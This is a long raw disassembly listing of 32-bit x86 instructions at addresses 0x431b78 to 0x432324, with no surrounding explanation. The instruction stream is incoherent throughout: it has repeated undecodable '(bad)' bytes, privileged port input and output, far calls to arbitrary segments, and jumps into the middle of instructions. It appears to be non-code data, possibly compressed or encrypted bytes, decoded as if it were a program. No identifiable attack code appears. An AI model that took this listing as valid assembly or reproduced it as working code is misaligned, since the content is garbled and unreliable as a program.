  431b78:	leave  
  431b79:	or     ebp,ecx
  431b7b:	nop
  431b7c:	mov    ds:0xd32b5d1c,al
  431b81:	and    bl,BYTE PTR [edx+ebx*2]
  431b84:	pop    ds
  431b85:	jnp    0x431b2b
  431b87:	test   eax,0xdaf101b2
  431b8c:	daa    
  431b8d:	ja     0x431bd3
  431b8f:	mov    bl,0x9f
  431b91:	or     bl,BYTE PTR [ebp+0x25]
  431b94:	enter  0xe234,0x34
  431b98:	and    BYTE PTR [ebx+0x5],cl
  431b9b:	jno    0x431c0f
  431b9d:	add    al,0x9a
  431b9f:	pop    esi
  431ba0:	in     al,0xd5
  431ba2:	add    al,0xfe
  431ba4:	mov    cl,0xcf
  431ba6:	sbb    edx,DWORD PTR [ecx-0x35]
  431ba9:	or     edx,esi
  431bab:	shl    DWORD PTR [esi-0x5595abf0],0xe4
  431bb2:	call   0xac2b:0xf92abbed
  431bb9:	mov    eax,ds:0x5e73a756
  431bbe:	fld    QWORD PTR [esi-0x79]
  431bc1:	outs   dx,DWORD PTR ds:[esi]
  431bc2:	ficom  DWORD PTR [edi]
  431bc4:	mov    dl,0x62
  431bc6:	out    dx,eax
  431bc7:	aas    
  431bc8:	retf   
  431bc9:	and    edi,ecx
  431bcb:	div    DWORD PTR [edi+0x14ffb50b]
  431bd1:	xor    al,0x35
  431bd3:	mov    al,ds:0xfb99d1d6
  431bd8:	dec    ebx
  431bd9:	or     eax,0xbb03a6ec
  431bde:	pop    eax
  431bdf:	sbb    ebp,DWORD PTR [ebp+0x4997150b]
  431be5:	in     eax,0x78
  431be7:	mov    al,ds:0xce9b7f89
  431bec:	ror    BYTE PTR [ebp+0x79a99d19],cl
  431bf2:	jbe    0x431ba2
  431bf4:	or     ecx,DWORD PTR [ebx]
  431bf6:	cmp    cl,ah
  431bf8:	cmp    BYTE PTR [edi+0xffcbe4b],cl
  431bfe:	mov    edi,0x6f8b33cf
  431c03:	xlat   BYTE PTR ds:[ebx]
  431c04:	mov    ecx,DWORD PTR [ebp+0x1e2e9fcc]
  431c0a:	cwde   
  431c0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431c0c:	jg     0x431c78
  431c0e:	aam    0x2f
  431c10:	shr    dh,cl
  431c12:	sbb    BYTE PTR [edx+esi*4],dh
  431c15:	push   eax
  431c16:	pop    ds
  431c17:	sbb    al,0x6c
  431c19:	int    0x75
  431c1b:	mov    ebp,0x4c9d0b41
  431c20:	in     al,dx
  431c21:	xchg   ebp,eax
  431c22:	cmp    eax,0x9d1e3255
  431c27:	fimul  DWORD PTR [ecx-0x7d117189]
  431c2d:	or     ch,cl
  431c2f:	nop
  431c30:	and    BYTE PTR [ebx-0x5b],bl
  431c33:	aas    
  431c34:	lds    ecx,FWORD PTR [ebx]
  431c36:	cmp    al,0xaa
  431c38:	fsub   st(5),st
  431c3a:	(bad)
  431c3d:	shr    ch,1
  431c3f:	div    DWORD PTR [edx-0xb0ae1f2]
  431c45:	adc    ebx,DWORD PTR [eax-0x45f42740]
  431c4b:	arpl   dx,di
  431c4d:	test   eax,0xbe531f78
  431c52:	cmp    al,BYTE PTR [ecx-0x7d]
  431c55:	dec    ebx
  431c56:	call   0x7031:0xc0cebee1
  431c5d:	mov    dh,0xbf
  431c5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431c60:	xor    eax,0x2d940265
  431c65:	ret    0x757e
  431c68:	mov    dl,0xbb
  431c6a:	or     DWORD PTR [eax-0x77],edx
  431c6d:	iret   
  431c6e:	pop    ss
  431c6f:	lods   al,BYTE PTR ds:[esi]
  431c70:	cmp    ecx,DWORD PTR [eax]
  431c72:	and    edx,DWORD PTR [ecx]
  431c74:	sbb    DWORD PTR [eax-0x33],ebx
  431c77:	out    0x2,al
  431c79:	mov    bl,0xa3
  431c7b:	xchg   esi,eax
  431c7c:	mov    dl,0x7b
  431c7e:	mov    esp,DWORD PTR [ecx]
  431c80:	sar    DWORD PTR [eax+eiz*4+0x46],1
  431c84:	loopne 0x431c91
  431c86:	pop    ds
  431c87:	sub    al,0xc6
  431c89:	or     al,0xfc
  431c8b:	out    dx,al
  431c8c:	std    
  431c8d:	mov    DWORD PTR [ebx-0x7112b192],ebx
  431c93:	test   eax,0x17b5c732
  431c98:	pop    esp
  431c99:	push   es
  431c9a:	call   0x8fd5:0xa5b57915
  431ca1:	sahf   
  431ca2:	scas   al,BYTE PTR es:[edi]
  431ca3:	dec    ecx
  431ca4:	scas   al,BYTE PTR es:[edi]
  431ca5:	xor    ch,BYTE PTR [edi]
  431ca7:	push   0xf0d04532
  431cac:	inc    ebx
  431cad:	cs sub al,0x0
  431cb0:	mov    dl,0x96
  431cb2:	cmp    esi,DWORD PTR [ebx]
  431cb4:	cmp    BYTE PTR [ecx+0xbcbb0eb],ah
  431cba:	dec    ecx
  431cbb:	mov    bh,0x95
  431cbd:	mov    edi,0xb3cdd28e
  431cc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431cc3:	arpl   WORD PTR [eax+0x3567240b],ax
  431cc9:	push   ds
  431cca:	or     al,BYTE PTR [ebp-0x5adfd1f7]
  431cd0:	ins    DWORD PTR es:[edi],dx
  431cd1:	dec    edx
  431cd2:	adc    BYTE PTR [ecx-0x46d8f2ba],bh
  431cd8:	fisub  DWORD PTR [ebx-0xda91841]
  431cde:	mov    ds:0x9ab8a728,eax
  431ce3:	and    bl,BYTE PTR [ebx-0x6b55a376]
  431ce9:	adc    al,0x98
  431ceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431cec:	jge    0x431c73
  431cee:	ja     0x431d32
  431cf0:	mov    edx,cs
  431cf2:	cmp    ebp,DWORD PTR [ebx-0x2265ce3f]
  431cf8:	sub    al,0x96
  431cfa:	inc    edx
  431cfb:	sub    al,dl
  431cfd:	sbb    ebx,eax
  431cff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431d00:	pushw  cs
  431d02:	not    BYTE PTR [ecx]
  431d04:	js     0x431d79
  431d06:	mov    ebx,0x7276ae5b
  431d0b:	xor    BYTE PTR [edx-0x12560088],0xfe
  431d12:	xchg   ebx,eax
  431d13:	adc    dh,bh
  431d15:	in     eax,0x6d
  431d17:	mov    al,ds:0xddf8ce20
  431d1c:	sbb    eax,0x6b8bfe4b
  431d21:	jle    0x431cbd
  431d23:	(bad)  
  431d24:	pop    eax
  431d25:	in     eax,0x8f
  431d27:	bound  ebx,QWORD PTR [bx+di]
  431d2a:	jl     0x431cd3
  431d2c:	sub    esi,DWORD PTR [ecx]
  431d2e:	retf   
  431d2f:	(bad)  
  431d31:	ins    DWORD PTR es:[edi],dx
  431d32:	retf   0xb180
  431d35:	mov    ebx,es
  431d37:	xchg   ebx,eax
  431d38:	stos   DWORD PTR es:[edi],eax
  431d39:	xchg   esi,eax
  431d3a:	push   edx
  431d3b:	inc    esp
  431d3c:	ret    0xdfb0
  431d3f:	test   esp,0x78a71229
  431d45:	pop    ebp
  431d46:	jle    0x431ccd
  431d48:	inc    edx
  431d49:	push   0x7f
  431d4b:	sbb    eax,0xa3ae45b2
  431d50:	gs jo  0x431d83
  431d53:	jbe    0x431d15
  431d55:	or     ebx,DWORD PTR [esi-0x3c]
  431d58:	loope  0x431d50
  431d5a:	adc    al,BYTE PTR [esi+edx*8]
  431d5d:	pop    ebx
  431d5e:	xchg   ecx,eax
  431d5f:	xor    al,0xce
  431d61:	pcmpgtd mm4,QWORD PTR [edi+0x5e85aa5a]
  431d68:	call   0x35e5429d
  431d6d:	inc    edx
  431d6e:	jnp    0x431d45
  431d70:	ret    
  431d71:	jnp    0x431d0e
  431d73:	mov    edx,0x559a52a9
  431d78:	imul   esi,DWORD PTR [ebx],0xffffff82
  431d7b:	sahf   
  431d7c:	dec    esp
  431d7d:	sbb    al,0x5
  431d7f:	pop    ecx
  431d80:	add    DWORD PTR [ebx],ecx
  431d82:	stc    
  431d83:	pop    ss
  431d84:	dec    edi
  431d85:	sahf   
  431d86:	mov    al,0x30
  431d88:	dec    ecx
  431d89:	pop    esp
  431d8a:	call   0xaeff:0x51f4b0a2
  431d91:	int    0xc7
  431d93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431d94:	scas   eax,DWORD PTR es:[edi]
  431d95:	mov    bl,dl
  431d97:	adc    eax,0x20ef64cc
  431d9c:	mov    dl,0x60
  431d9e:	push   ebx
  431d9f:	and    DWORD PTR [edi-0x4],esi
  431da2:	add    eax,0x160bfb1d
  431da7:	rcr    DWORD PTR [edx+0x545ebbb8],0xd9
  431dae:	call   0x5bdc:0x719e0ceb
  431db5:	lds    ebx,FWORD PTR [eax]
  431db7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431db8:	fmul   st(5),st
  431dba:	cmp    ebx,DWORD PTR [ecx+esi*1-0x44b96e37]
  431dc1:	push   edx
  431dc2:	inc    ebp
  431dc3:	push   0xffffff92
  431dc5:	mov    dh,BYTE PTR [ebp+0x5c]
  431dc8:	mov    bh,0xae
  431dca:	data16 loopne 0x431d7e
  431dcd:	or     ebx,DWORD PTR [ebp-0x39]
  431dd0:	sub    ecx,DWORD PTR [ebx+ecx*4-0x64e19263]
  431dd7:	sbb    ah,BYTE PTR [eax]
  431dd9:	jo     0x431dad
  431ddb:	fbld   TBYTE PTR [edx+0x37]
  431dde:	jle    0x431e52
  431de0:	test   al,0xb
  431de2:	shl    edi,cl
  431de4:	xchg   edi,eax
  431de5:	(bad)  
  431de6:	sbb    BYTE PTR [eax],bl
  431de8:	sbb    ecx,eax
  431dea:	mov    DWORD PTR [ecx+0x589aa94d],edi
  431df0:	cmp    dh,ah
  431df2:	sub    esi,DWORD PTR [ecx]
  431df4:	out    dx,eax
  431df5:	add    al,0x60
  431df7:	daa    
  431df8:	jp     0x431d8b
  431dfa:	sbb    bh,BYTE PTR [eax]
  431dfc:	jno    0x431db6
  431dfe:	pop    ss
  431dff:	div    DWORD PTR [edx+0x13de5b75]
  431e05:	ins    DWORD PTR es:[edi],dx
  431e06:	mov    ch,0x17
  431e08:	fisttp QWORD PTR [ebx]
  431e0a:	fldcw  WORD PTR [ecx+eiz*4+0x434e9c87]
  431e11:	out    0xbe,eax
  431e13:	xchg   BYTE PTR [eax-0x656765b9],al
  431e19:	xor    DWORD PTR [ecx+0x2a0b5270],0x52
  431e20:	into   
  431e21:	jg     0x431de2
  431e23:	aaa    
  431e24:	cmp    ebp,ebx
  431e26:	fwait
  431e27:	lea    edx,[ecx-0x50]
  431e2a:	int    0xc0
  431e2c:	(bad)  
  431e2d:	test   DWORD PTR [esi-0x4f],0x58d80b5c
  431e34:	fstp   DWORD PTR [eax+0x51dd0ee0]
  431e3a:	mov    ds:0x680b639a,al
  431e3f:	cmp    BYTE PTR ds:0x3ef36e1,dl
  431e45:	jne    0x431e31
  431e47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431e48:	xchg   esi,eax
  431e49:	idiv   DWORD PTR [edi+esi*8]
  431e4c:	cs jmp 0xf243:0x11b37d53
  431e54:	scas   eax,DWORD PTR es:[edi]
  431e55:	jbe    0x431e7f
  431e57:	jmp    0x431eaf
  431e59:	(bad)  
  431e5a:	jmp    DWORD PTR [edx+ecx*2-0x4b73e3fd]
  431e61:	pop    edi
  431e62:	push   edx
  431e63:	cmp    ah,dl
  431e65:	xchg   ebx,eax
  431e66:	call   0xc923:0xf9b05713
  431e6d:	fldenv [ecx-0x10e9d82f]
  431e73:	arpl   WORD PTR [ebx-0x6d52e235],di
  431e79:	add    DWORD PTR ds:0x32d7b2be,0x5918b339
  431e83:	test   bl,ah
  431e85:	or     esi,DWORD PTR [ecx]
  431e87:	inc    ebx
  431e88:	(bad)  
  431e89:	jmp    0x529a:0x653dd00e
  431e90:	sbb    al,0x8
  431e92:	nop
  431e93:	(bad)  
  431e94:	mov    ebp,0xffa7abe1
  431e99:	and    BYTE PTR [esi-0x3e],ah
  431e9c:	and    BYTE PTR [eax+ebp*1],0xcb
  431ea0:	mov    ah,BYTE PTR [ecx]
  431ea2:	xchg   DWORD PTR [edi],esp
  431ea4:	push   es
  431ea5:	xlat   BYTE PTR ds:[ebx]
  431ea6:	out    0x54,al
  431ea8:	mov    al,ds:0x96a70f43
  431ead:	cdq    
  431eae:	sub    al,0xc4
  431eb0:	fwait
  431eb1:	jecxz  0x431e70
  431eb3:	xor    al,0xb5
  431eb5:	adc    DWORD PTR [ecx+0x2aac8a10],ebx
  431ebb:	gs mov esi,ecx
  431ebe:	mov    DWORD PTR [edi],edx
  431ec0:	lods   eax,DWORD PTR ds:[esi]
  431ec1:	je     0x431f02
  431ec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431ec4:	fs in  eax,dx
  431ec6:	mov    dl,0xa0
  431ec8:	cmc    
  431ec9:	jb     0x431ef2
  431ecb:	test   al,0xb2
  431ecd:	mov    ecx,esi
  431ecf:	mov    ch,0x6e
  431ed1:	imul   bh
  431ed3:	push   ds
  431ed4:	mov    cl,BYTE PTR [edx]
  431ed6:	data16 xor BYTE PTR [edi],ch
  431ed9:	pop    ds
  431eda:	mov    dl,0xab
  431edc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431edd:	jnp    0x431ee8
  431edf:	cwde   
  431ee0:	mov    dl,0xc7
  431ee2:	mov    edi,0xfa5e33a3
  431ee7:	cld    
  431ee8:	ror    BYTE PTR [ebx],0xdf
  431eeb:	xor    DWORD PTR [edx],edi
  431eed:	mov    edx,0x999e89e0
  431ef2:	mov    ds:0x8a02948d,eax
  431ef7:	imul   ecx,DWORD PTR [ebx-0x714bda75],0xffffffb4
  431efe:	xor    BYTE PTR [eax],dh
  431f00:	repnz push ebp
  431f02:	mov    al,ds:0x28c6b26d
  431f07:	fmul   st(7),st
  431f09:	mov    bl,0xec
  431f0b:	inc    ecx
  431f0c:	scas   eax,DWORD PTR es:[edi]
  431f0d:	aaa    
  431f0e:	jbe    0x431f63
  431f10:	or     eax,0xb2b15205
  431f15:	jno    0x431efa
  431f17:	sbb    eax,ebp
  431f19:	aad    0x45
  431f1b:	ret    0x3b9
  431f1e:	mov    al,ds:0x9b8bea60
  431f23:	fwait
  431f24:	push   ss
  431f25:	les    esp,FWORD PTR ds:0x260567a7
  431f2b:	std    
  431f2c:	aam    0x1f
  431f2e:	int    0xb4
  431f30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431f31:	repz mov ds:0xf3ebb287,eax
  431f37:	nop
  431f38:	jns    0x431ed2
  431f3a:	mov    ch,0xa7
  431f3c:	mov    bl,0xd4
  431f3e:	mov    ebx,0x44c3339d
  431f43:	jle    0x431ed4
  431f45:	stos   DWORD PTR es:[edi],eax
  431f46:	jecxz  0x431eef
  431f48:	aaa    
  431f49:	adc    BYTE PTR [edi-0x14],bl
  431f4c:	or     eax,0xea71e55
  431f51:	sub    eax,0x5cac1340
  431f56:	xchg   edx,eax
  431f57:	sub    dh,BYTE PTR [edx-0x65e12121]
  431f5d:	jns    0x431fd8
  431f5f:	xor    al,0x33
  431f61:	out    0x56,al
  431f63:	out    0xe,eax
  431f65:	or     edx,DWORD PTR ds:0x289db7a5
  431f6b:	cmp    esp,DWORD PTR [edx+ebp*4-0x293e7266]
  431f72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431f73:	jns    0x431f7f
  431f75:	cmp    eax,0x32dda5cc
  431f7a:	js     0x431f78
  431f7c:	mov    ah,0x3f
  431f7e:	jp     0x431f49
  431f80:	dec    esp
  431f81:	inc    ebp
  431f82:	add    DWORD PTR fs:[edx+0x6a03fb21],esi
  431f89:	ins    DWORD PTR es:[edi],dx
  431f8a:	cdq    
  431f8b:	mov    BYTE PTR [eax+0xb],bl
  431f8e:	jp     0x431f46
  431f90:	cmc    
  431f91:	cwde   
  431f92:	xor    DWORD PTR [ebp+0x59a13f3],esp
  431f98:	jg     0x431f47
  431f9a:	push   edx
  431f9b:	aam    0x5f
  431f9d:	test   DWORD PTR [ebp+0x4f],ecx
  431fa0:	fnstenv [ebx]
  431fa2:	mov    eax,0x7a83b2b6
  431fa7:	sahf   
  431fa8:	call   0x1562:0xb1643ce0
  431faf:	fist   DWORD PTR [ecx+0x721b2469]
  431fb5:	ins    DWORD PTR es:[edi],dx
  431fb6:	(bad)  
  431fb7:	adc    DWORD PTR [ecx],esi
  431fb9:	xor    eax,0x2732d5f1
  431fbe:	test   eax,0x5c1c2531
  431fc3:	pushf  
  431fc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431fc5:	pop    esp
  431fc6:	jecxz  0x431fa3
  431fc8:	mov    ah,0x8
  431fca:	and    al,0xb7
  431fcc:	inc    edx
  431fcd:	sbb    BYTE PTR [ebp-0x43f438ea],bh
  431fd3:	and    BYTE PTR [edi-0x47272bb5],dl
  431fd9:	test   DWORD PTR [esi],0x86ecff21
  431fdf:	dec    edi
  431fe0:	xor    bl,BYTE PTR [edx]
  431fe2:	pop    ds
  431fe3:	lods   al,BYTE PTR gs:[esi]
  431fe5:	and    eax,0x56c1a790
  431fea:	or     eax,0xdaa1e212
  431fef:	(bad)  
  431ff0:	mov    BYTE PTR [esi],dl
  431ff2:	pop    ss
  431ff3:	daa    
  431ff4:	call   0xb573aa5
  431ff9:	push   edx
  431ffa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431ffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  431ffc:	sub    al,0x47
  431ffe:	xlat   BYTE PTR ds:[ebx]
  431fff:	mov    ebx,0xa3aabbf5
  432004:	retf   0xece8
  432007:	and    ebx,DWORD PTR [eax+0x39]
  43200a:	stos   BYTE PTR es:[edi],al
  43200b:	push   esp
  43200c:	inc    eax
  43200d:	mov    ds:0xbb49e6d,eax
  432012:	mov    edx,0xf02f0e2f
  432017:	popf   
  432018:	ins    BYTE PTR es:[edi],dx
  432019:	sahf   
  43201a:	call   0x3b49:0x470ed9f0
  432021:	(bad)  
  432022:	xor    eax,0x416cbba7
  432027:	cwde   
  432028:	jge    0x431fe2
  43202a:	mov    ch,0x5d
  43202c:	int    0x81
  43202e:	loopne 0x432007
  432030:	mov    bl,0xc0
  432032:	icebp  
  432033:	(bad)  
  432034:	js     0x432058
  432036:	dec    ebp
  432037:	mov    ch,0x66
  432039:	adc    DWORD PTR [esi-0x59],ebp
  43203c:	add    DWORD PTR [esi],edx
  43203e:	sti    
  43203f:	pop    edx
  432040:	push   ss
  432041:	xor    bh,BYTE PTR [ecx+0x2a]
  432044:	mov    dl,0xbf
  432046:	mov    esi,0x564097e5
  43204b:	test   al,0xcb
  43204d:	xor    eax,0xb83122d5
  432052:	inc    ebx
  432053:	ficomp DWORD PTR ds:0xa7ed2310
  432059:	fild   DWORD PTR [ebx+eiz*1-0x3f]
  43205d:	test   BYTE PTR es:[eax],ah
  432060:	cs call 0x7134fb80
  432066:	addr16 jmp 0x432036
  432069:	or     ecx,ebx
  43206b:	retf   
  43206c:	stos   BYTE PTR es:[edi],al
  43206d:	inc    ebx
  43206e:	cld    
  43206f:	sbb    al,0xf5
  432071:	aad    0xc2
  432073:	test   eax,0xa3d11495
  432078:	repnz sub BYTE PTR [eax+0x71],0x86
  43207d:	jno    0x432095
  43207f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432080:	xor    al,BYTE PTR [ecx]
  432082:	sub    edx,ebp
  432084:	and    BYTE PTR [eax-0x7e],bl
  432087:	jp     0x43203b
  432089:	and    edi,ebp
  43208b:	dec    edi
  43208c:	fistp  DWORD PTR [edi-0xf]
  43208f:	mov    BYTE PTR [edi+0x751d770b],ch
  432095:	adc    ah,0x48
  432098:	add    dl,0x90
  43209b:	call   0x74b2:0xa656e51
  4320a2:	fisttp DWORD PTR [ebp-0x3f820a60]
  4320a8:	test   BYTE PTR [ebx+0x2b23a7b7],ah
  4320ae:	inc    ecx
  4320af:	cli    
  4320b0:	mov    dl,0xcd
  4320b2:	into   
  4320b3:	hlt    
  4320b4:	out    0x75,eax
  4320b6:	dec    edx
  4320b7:	in     eax,dx
  4320b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4320b9:	sub    BYTE PTR ss:[edx],ch
  4320bc:	mov    ch,0xca
  4320be:	fisubr DWORD PTR [edx+0x53deba1c]
  4320c4:	enter  0x32f7,0x3a
  4320c8:	mov    dl,0xbd
  4320ca:	add    esi,edx
  4320cc:	bound  eax,QWORD PTR [ebx-0x53]
  4320cf:	jnp    0x432113
  4320d1:	out    0x66,al
  4320d3:	add    BYTE PTR [edi+0x3a5f99fb],dh
  4320d9:	or     esi,DWORD PTR [ebp+0x63]
  4320dc:	iret   
  4320dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4320de:	ja     0x43212f
  4320e0:	(bad)  
  4320e2:	call   0xdc8:0xc9235060
  4320e9:	mov    ebx,0x51d6a784
  4320ee:	dec    esi
  4320ef:	fstp   TBYTE PTR [ebx]
  4320f1:	in     eax,dx
  4320f2:	xor    bl,BYTE PTR [ecx]
  4320f4:	mov    dl,0x4e
  4320f6:	(bad)  
  4320f7:	aam    0x30
  4320f9:	add    BYTE PTR [ebx+0x5015bb87],bh
  4320ff:	adc    ebx,DWORD PTR [esi]
  432101:	int3   
  432102:	xchg   edi,eax
  432103:	jge    0x432104
  432105:	mov    esp,edi
  432107:	xor    al,0xd5
  432109:	fdivr  DWORD PTR [esi-0x37]
  43210c:	mov    dl,0x5a
  43210e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43210f:	push   esi
  432110:	loope  0x4320c7
  432112:	jp     0x4320a6
  432114:	or     BYTE PTR [ebx],0xe1
  432117:	stos   BYTE PTR es:[edi],al
  432118:	pop    ds
  432119:	or     bh,BYTE PTR [ecx+0x6d]
  43211c:	sub    eax,0xb2b16071
  432121:	jae    0x4320e9
  432123:	mov    bl,0xe7
  432125:	mov    eax,ds:0x7ff5a35e
  43212a:	jmp    0x40c0:0xeb43f8a7
  432131:	test   eax,0x62c6d151
  432136:	call   0xa04d:0x6dec9098
  43213d:	call   0x1e3ac8c1
  432142:	in     eax,0x36
  432144:	inc    ebx
  432145:	sbb    esi,DWORD PTR [ebp+eiz*4+0x2cad26b2]
  43214c:	ret    
  43214d:	test   BYTE PTR [eax+0x19],cl
  432150:	test   eax,0x870a260a
  432155:	sahf   
  432156:	out    0x7c,eax
  432158:	ins    BYTE PTR es:[edi],dx
  432159:	cmp    esp,DWORD PTR [ebp+0x43]
  43215c:	mov    dl,0x56
  43215e:	mov    ch,0xcf
  432160:	shr    dl,1
  432162:	ret    0x4142
  432165:	or     edi,DWORD PTR [edi]
  432167:	test   al,0xd
  432169:	sub    DWORD PTR [edx-0x70],eax
  43216c:	sbb    esp,esp
  43216e:	cmp    dl,BYTE PTR [eax-0x1c]
  432171:	jnp    0x432110
  432173:	rcl    DWORD PTR [esi-0x7e],1
  432176:	fist   DWORD PTR [edi-0x32a4505e]
  43217c:	mov    ch,0xb
  43217e:	shl    DWORD PTR [edx-0x13],cl
  432181:	and    dh,BYTE PTR [edi]
  432183:	sahf   
  432184:	inc    ebp
  432185:	(bad)  
  432186:	xchg   ebp,eax
  432187:	push   ds
  432188:	call   0x640b2120
  43218d:	stc    
  43218e:	or     DWORD PTR [ebx+0x57],0xb
  432192:	ja     0x4321fe
  432194:	fnsave [ebp+0x65]
  432197:	dec    eax
  432198:	xor    BYTE PTR [ebx],bh
  43219a:	loopne 0x432188
  43219c:	lods   al,BYTE PTR ds:[esi]
  43219d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43219e:	iret   
  43219f:	out    0xf2,al
  4321a1:	fmul   QWORD PTR [esp+ebx*1]
  4321a4:	pop    ecx
  4321a5:	(bad)  [ecx-0x58]
  4321a8:	sub    bl,BYTE PTR [ecx]
  4321aa:	inc    ebx
  4321ab:	fnstenv [edx]
  4321ad:	mov    ah,0x6c
  4321af:	add    BYTE PTR [edx-0x29],cl
  4321b2:	call   0xf611dfad
  4321b7:	push   ss
  4321b8:	popf   
  4321b9:	dec    ebx
  4321ba:	adc    DWORD PTR [edx],edx
  4321bc:	or     ebx,DWORD PTR [esi+0x5d]
  4321bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4321c0:	push   cs
  4321c1:	xchg   ebp,eax
  4321c2:	or     esi,DWORD PTR [ebx-0x4acf821f]
  4321c8:	mov    dl,0x9c
  4321ca:	mov    dh,0x6d
  4321cc:	aam    0x1a
  4321ce:	ficomp DWORD PTR [eax]
  4321d0:	inc    ebp
  4321d1:	add    eax,0xf1a40be6
  4321d6:	mov    ds:0x9a04dabf,al
  4321db:	retf   
  4321dc:	outs   dx,DWORD PTR ds:[esi]
  4321dd:	mov    ebp,0x8d60c305
  4321e2:	out    dx,al
  4321e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4321e4:	inc    edi
  4321e5:	mov    esi,0xc308c786
  4321ea:	xchg   ebx,ebp
  4321ec:	mov    ch,0xb8
  4321ee:	nop
  4321ef:	in     al,dx
  4321f0:	ret    
  4321f1:	les    ebp,FWORD PTR [edx-0x139b009b]
  4321f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4321f8:	ins    DWORD PTR es:[edi],dx
  4321f9:	pop    ebx
  4321fa:	mov    esi,0xaf6f9de7
  4321ff:	dec    ecx
  432200:	scas   eax,DWORD PTR es:[edi]
  432201:	mov    al,ds:0xc8b26067
  432206:	(bad)  
  432207:	in     al,0x29
  432209:	mov    bl,0xb8
  43220b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43220c:	inc    eax
  43220d:	xor    DWORD PTR [eax+0x3d],0x4
  432211:	sbb    bh,BYTE PTR [ebp-0x55674dd0]
  432217:	repnz rol esi,cl
  43221a:	cdq    
  43221b:	mov    ecx,0xe84f0b39
  432220:	js     0x43224a
  432222:	daa    
  432223:	sbb    edi,DWORD PTR [edx]
  432225:	fwait
  432226:	call   0x9a34:0xf291abb2
  43222d:	int    0x62
  43222f:	mov    al,ds:0xe55bd9f6
  432234:	adc    cl,bl
  432236:	imul   esi,DWORD PTR ds:0x776f5b40,0x6e
  43223d:	xchg   ebp,eax
  43223e:	call   0x21e4:0x1c3d3c95
  432245:	or     bl,BYTE PTR [esi+0x7fec1da7]
  43224b:	adc    al,0x38
  43224d:	inc    edx
  43224e:	in     eax,0x85
  432250:	mov    dl,0xc1
  432252:	xchg   edx,eax
  432253:	sbb    ebx,DWORD PTR [edx-0x54dc8d6d]
  432259:	or     ecx,DWORD PTR [ecx+0x3b]
  43225c:	jne    0x4322cd
  43225e:	imul   eax,DWORD PTR [eax-0x6c],0xae839ab5
  432265:	pop    esi
  432266:	test   esi,esi
  432268:	sti    
  432269:	mov    eax,ds:0x24acb89b
  43226e:	or     al,0x27
  432270:	aas    
  432271:	bound  edi,QWORD PTR [edi+0x2d]
  432274:	mov    WORD PTR [esi+0x7caa089a],ss
  43227a:	sub    esi,DWORD PTR [ecx+edx*1]
  43227d:	inc    edi
  43227e:	inc    ecx
  43227f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  432280:	ret    0xb700
  432283:	test   eax,0x47c9ff90
  432288:	mov    dl,0x5e
  43228a:	sbb    BYTE PTR [ebp+ecx*4-0x78],0x2d
  43228f:	adc    edx,DWORD PTR [esp+eax*1]
  432292:	and    DWORD PTR [ebx-0xe],0x6a
  432296:	sbb    ecx,DWORD PTR [ebx]
  432298:	and    eax,0xd47f7d06
  43229d:	xchg   esi,eax
  43229e:	call   0x8d96:0x1c6df34
  4322a5:	in     eax,dx
  4322a6:	xlat   BYTE PTR ds:[ebx]
  4322a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4322a8:	std    
  4322a9:	sbb    eax,0xd89257b1
  4322ae:	jp     0x43225d
  4322b0:	mov    ecx,0x8adfee85
  4322b5:	mov    eax,DWORD PTR [ebp+0x32646575]
  4322bb:	xchg   edi,eax
  4322bc:	jne    0x4322d7
  4322be:	xchg   BYTE PTR [eax],cl
  4322c0:	xor    DWORD PTR [ecx-0x66],esi
  4322c3:	sbb    edx,DWORD PTR [ebx-0x2faa7922]
  4322c9:	inc    edi
  4322ca:	xor    DWORD PTR [edi-0x5e1e5513],esp
  4322d0:	add    al,0x9
  4322d2:	adc    DWORD PTR [edx-0x4175016a],eax
  4322d8:	mov    dl,0xfc
  4322da:	lods   eax,DWORD PTR ds:[esi]
  4322db:	xor    eax,0xbab6298e
  4322e0:	cli    
  4322e1:	pop    edx
  4322e2:	add    DWORD PTR [esi+0x52],esp
  4322e5:	ret    0x874b
  4322e8:	(bad)  
  4322ea:	pop    edx
  4322eb:	xchg   bl,cl
  4322ed:	loope  0x432289
  4322ef:	jmp    0x43236e
  4322f1:	ficom  WORD PTR [edx]
  4322f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4322f4:	outs   dx,DWORD PTR ds:[esi]
  4322f5:	out    dx,al
  4322f6:	mov    WORD PTR [edi+0x34afb4fc],fs
  4322fc:	es adc al,0x8e
  4322ff:	sub    esi,0x39a7efcc
  432305:	xor    esi,DWORD PTR [edi+0x45e10f45]
  43230b:	inc    ebx
  43230c:	lea    eax,[ebx+ecx*8]
  43230f:	shl    DWORD PTR [eax-0x42],cl
  432312:	fucomi st,st(5)
  432314:	(bad)  
  432315:	cs adc al,0x7a
  432318:	mov    edx,0xb2f53ed3
  43231d:	fs push esi
  43231f:	dec    ebx
  432320:	ins    DWORD PTR es:[edi],dx
  432321:	push   sp
  432323:	dec    ebp
  432324:	scas   eax,DWORD PTR es:[edi]
